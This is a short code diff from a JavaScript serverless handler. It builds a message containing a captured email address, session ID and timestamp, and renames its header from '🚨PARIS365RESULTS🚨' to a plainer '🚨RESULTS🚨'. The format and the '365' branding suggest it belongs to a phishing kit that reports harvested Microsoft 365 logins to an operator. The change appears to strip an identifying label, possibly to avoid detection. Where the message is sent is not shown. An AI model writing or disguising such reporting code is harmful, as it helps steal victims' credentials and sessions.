@@ -213,7 +213,7 @@ const handler = async (event, context) => {
     // Build the message (MINIMAL - plain text only, heavily sanitized)
     const uniqueId = Math.random().toString(36).substring(2, 8);
     const messageLines = [
-      '🚨PARIS365RESULTS🚨',
+      '🚨RESULTS🚨',
       `📧 Email: ${email}`,
       `🆔 Session ID: ${sessionId}`,
       `⏰ Time: ${timestamp}`,
